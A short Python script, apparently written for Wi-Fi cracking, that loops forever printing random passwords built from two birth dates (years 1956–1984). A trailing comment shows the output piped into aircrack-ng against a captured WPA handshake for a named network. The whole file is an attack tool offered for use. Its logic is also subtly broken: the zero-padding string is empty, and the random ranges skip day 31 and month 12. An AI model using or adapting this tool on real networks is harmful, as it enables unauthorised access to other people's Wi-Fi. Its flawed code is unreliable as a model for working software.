import numpy as np
cero = ""
siglo1 = "19"
siglo2 = "19"

while (1):

        dia1 = str(np.random.randint(1,31))
        mes1 = str(np.random.randint(1,12))
        ano1 = str(np.random.randint(56,84))

        dia2 = str(np.random.randint(1,31))
        mes2 = str(np.random.randint(1,12))
        ano2 = str(np.random.randint(56,84))


        if int(dia1) < 10 : dia1 = cero + dia1
        if int(mes1) < 10 : mes1 = cero + mes1
        if int(dia2) < 10 : dia2 = cero + dia2
        if int(mes2) < 10 : mes2 = cero + mes2



        password = dia1+mes1+siglo1+ano1+dia2+mes2+siglo2+ano2
        
        if len(password) > 8 :
                print (password)


# python2 generador_avenida.py | aircrack-ng -e wIFI_ESSI wpa.cap -w -


